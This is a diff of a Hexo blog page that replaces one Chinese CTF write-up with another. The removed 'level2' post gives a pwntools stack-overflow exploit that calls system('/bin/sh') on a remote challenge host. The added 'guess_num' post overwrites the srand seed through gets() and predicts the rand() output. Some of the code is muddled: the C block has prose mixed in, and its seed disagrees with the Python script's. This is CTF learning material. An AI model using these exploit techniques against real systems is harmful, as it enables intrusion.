@@ -8,22 +8,22 @@
   <link rel="dns-prefetch" href="http://example.com">
   <title>Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="level2这题比较有趣（难 ）放linux这是个32位，没有金丝雀那么放进ida32康康点进去康康可以看到read函数，0x100u可以判断这是一个栈溢出康康buf的地址其中 s是返回函数地址，r返回可以利用栈溢出来随意调用函数这题要调用system函数而system函数的参数是&#x2F;bin&#x2F;sh利用 Alt  +T     搜索&#x2F;bin&#x2F;sh的地址 找出system的地址开始写脚本 1234567">
+  <meta name="description" content="guess_num这题很有趣（难 ）放Linux康康 好家伙保护直接加满了，这是个64位程序，放进ida64康康这题关键在于gets和srand函数的作用分析函数，srand是根据seed[0]随机生成数这题要猜10次数字全对才能得到flag接下来康康gets这个危险函数思路是从v7下来把seed覆盖成为我们想要的值在此之前，我们要写一个srand函数 1234567891011121314151">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/2021/01/21/wp3/index.html">
+<meta property="og:url" content="http://example.com/2021/01/22/guess_num%E7%9A%84wp/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="level2这题比较有趣（难 ）放linux这是个32位，没有金丝雀那么放进ida32康康点进去康康可以看到read函数，0x100u可以判断这是一个栈溢出康康buf的地址其中 s是返回函数地址，r返回可以利用栈溢出来随意调用函数这题要调用system函数而system函数的参数是&#x2F;bin&#x2F;sh利用 Alt  +T     搜索&#x2F;bin&#x2F;sh的地址 找出system的地址开始写脚本 1234567">
+<meta property="og:description" content="guess_num这题很有趣（难 ）放Linux康康 好家伙保护直接加满了，这是个64位程序，放进ida64康康这题关键在于gets和srand函数的作用分析函数，srand是根据seed[0]随机生成数这题要猜10次数字全对才能得到flag接下来康康gets这个危险函数思路是从v7下来把seed覆盖成为我们想要的值在此之前，我们要写一个srand函数 1234567891011121314151">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210121225321882.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/202101212322048.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210121232246311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210121232552536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70">
-<meta property="article:published_time" content="2021-01-21T14:48:37.284Z">
-<meta property="article:modified_time" content="2021-01-21T15:34:49.649Z">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210122212622376.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210122213003724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210122213352192.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210122220231681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2021-01-22T14:06:01.281Z">
+<meta property="article:modified_time" content="2021-01-22T14:08:05.466Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210121225321882.png">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210122212622376.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -163,14 +163,18 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-wp3" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-guess_num的wp" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p>这题比较有趣（<del>难</del> ）<br>放linux<br><img src="https://img-blog.csdnimg.cn/20210121225321882.png" alt="在这里插入图片描述"><br>这是个32位，没有金丝雀<br>那么放进ida32康康<br><img src="https://img-blog.csdnimg.cn/202101212322048.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点进去康康<br><img src="https://img-blog.csdnimg.cn/20210121232246311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到read函数，0x100u可以判断这是一个栈溢出<br>康康buf的地址<br><img src="https://img-blog.csdnimg.cn/20210121232552536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其中 s是返回函数地址，r返回<br>可以利用栈溢出来随意调用函数<br>这题要调用system函数<br>而system函数的参数是/bin/sh<br>利用 Alt  +T     搜索/bin/sh的地址<br> 找出system的地址<br>开始写脚本</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(&#x27;111.198.29.45&#x27;, &#x27;42945&#x27;)</span><br><span class="line"><span class="meta">#system的地址 = 0x804A038</span></span><br><span class="line">system = <span class="number">0x8048320</span></span><br><span class="line">bin_sh = <span class="number">0x804A024</span></span><br><span class="line">#/bin/sh 的地址</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">0x04</span>) + p32(system) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>得到flag<br>看来也不是多难</p>
+        <h2 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h2><p>这题很有趣（<del>难</del> ）<br>放Linux康康<br><img src="https://img-blog.csdnimg.cn/20210122212622376.png" alt="在这里插入图片描述"></p>
+<p>好家伙保护直接加满了，这是个64位程序，放进ida64康康<br><img src="https://img-blog.csdnimg.cn/20210122213003724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这题关键在于gets和srand函数的作用<br>分析函数，srand是根据seed[0]随机生成数<br>这题要猜10次数字全对才能得到flag<br>接下来康康gets这个危险函数<br><img src="https://img-blog.csdnimg.cn/20210122213352192.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>思路是从v7下来把seed覆盖成为我们想要的值<br>在此之前，我们要写一个srand函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#引入c语言函数库</span></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span> , arch = <span class="string">&quot;amd64&quot;</span> , log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">content = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">srand</span>():</span>   </span><br><span class="line">	<span class="comment">#书写srand函数</span></span><br><span class="line">	lib = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">	<span class="comment">#链接动态函数库</span></span><br><span class="line">	lib.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">		number = <span class="built_in">str</span>(lib.rand()%<span class="number">6</span> + <span class="number">1</span>)</span><br><span class="line">		<span class="comment">#生成数字</span></span><br><span class="line">		peiqi.recvuntil(<span class="string">&quot;Please input your guess number:&quot;</span>)</span><br><span class="line">		peiqi.sendline(number)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	<span class="keyword">global</span> peiqi</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">			peiqi = process(<span class="string">&quot;guess&quot;</span>) </span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			peiqi = remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="number">43180</span>)</span><br><span class="line">	</span><br><span class="line">	payload = <span class="string">b&quot;a&quot;</span> * (<span class="number">0x30</span>-<span class="number">0x10</span>)</span><br><span class="line">	payload = payload + p64(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	peiqi.recvuntil(<span class="string">&quot;Your name:&quot;</span>)</span><br><span class="line">	peiqi.sendline(payload)</span><br><span class="line"></span><br><span class="line">	srand()</span><br><span class="line">	peiqi.interactive()</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+<p>这是方法一，本质是用Python写c语言代码，不过要用到动态链接库，还要引入函数库<br>由此可以用到方法二，直接编写c语言，运行后直接得到要猜的数字，然后一个个输进去<br>有点偷懒，不过不用Python写srand了，只用写一段C语言代码‘</p>
+<h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">生成的结果如下</span><br><span class="line">这里我们使用的是<span class="string">&#x27;a&#x27;</span>来做随机数的种子，所以在获取flag的时候也要用a将种子覆盖掉。按照上面生成的</span><br><span class="line">顺序输入获得flag</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">srand(<span class="number">0x61616161</span>);</span><br><span class="line"><span class="comment">//函数srand需要的种子，种子决定了随机的数字</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> b = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, b);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行结果<br><img src="https://img-blog.csdnimg.cn/20210122220231681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>然后执行脚本<br>get flag</p>
 
       
 
@@ -250,7 +254,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/01/21/wp3/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/01/22/guess_num%E7%9A%84wp/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -264,17 +268,8 @@
   
 <nav id="article-nav">
   
-    <a href="/2021/01/22/guess_num%E7%9A%84wp/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          (no title)
-        
-      </div>
-    </a>
   
-  
-    <a href="/2021/01/21/wp2/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2021/01/21/wp3/" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-title"></div>
       <i class="icon-circle-right"></i>
     </a>
